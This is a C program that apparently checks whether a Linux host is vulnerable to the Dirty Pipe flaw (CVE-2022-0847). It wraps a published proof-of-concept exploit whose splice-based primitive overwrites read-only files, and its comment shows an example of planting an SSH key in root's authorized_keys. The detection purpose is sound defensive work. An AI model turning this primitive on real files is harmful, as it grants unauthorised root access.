/*
NAME: 6f16602a-2cb4-4004-b3c6-0e80fbef708c_linux.c
QUESTION: Is this host vulnerable to CVE-2022-0847 (Dirty Pipe)?
CREATED: 2022-11-03
NOTES: Added a DCF wrapper on the exploit. -VVX7
*/
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

const char *const path = "/tmp/detect_cve_2022_0847";

static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

void test(void) {
    loff_t offset = 4;
    const char *const data = "BBBB\n";
    const size_t data_size = strlen(data);

    FILE *f1 = fopen(path, "w");
    if (f1 == NULL) {
        printf("Failed to open %s\n", path);
        exit(1);
    }
    fputs("AAAAAAAA\n", f1);
    fclose(f1);

    if (offset % PAGE_SIZE == 0) {
        fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
        exit(1);
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;
    if (end_offset > next_page) {
        fprintf(stderr, "Sorry, cannot write across a page boundary\n");
        exit(1);
    }

    const int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        exit(1);
    }

    struct stat st;
    if (fstat(fd, &st)) {
        perror("stat failed");
        exit(1);
    }

    if (offset > st.st_size) {
        fprintf(stderr, "Offset is not inside the file\n");
        exit(1);
    }

    if (end_offset > st.st_size) {
        fprintf(stderr, "Sorry, cannot enlarge the file\n");
        exit(1);
    }

    int p[2];
    prepare_pipe(p);

    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        exit(1);
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        exit(1);
    }

    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("write failed");
        exit(1);
    }
    if ((size_t)nbytes < data_size) {
        fprintf(stderr, "short write\n");
        exit(1);
    }

    // read tmp file
    FILE *f2 = fopen(path, "r");
    char c;
    if (f1 == NULL) {
        printf("Failed to open %s\n", path);
        exit(1);
    }
    while ((c = (char)getc(f2)) != EOF) {
        if (c == 'B') {
            fclose(f2);
            exit(100);
        }
    }

    fclose(f2);
    exit(101);
}

void clean(void) {
    if (remove(path) == 0) {
        exit(100);
    } else {
        exit(104);
    }
}

int main(int argc, char *argv[])
{
    if (argc > 1) {
        clean();
    } else {
        test();
    }
}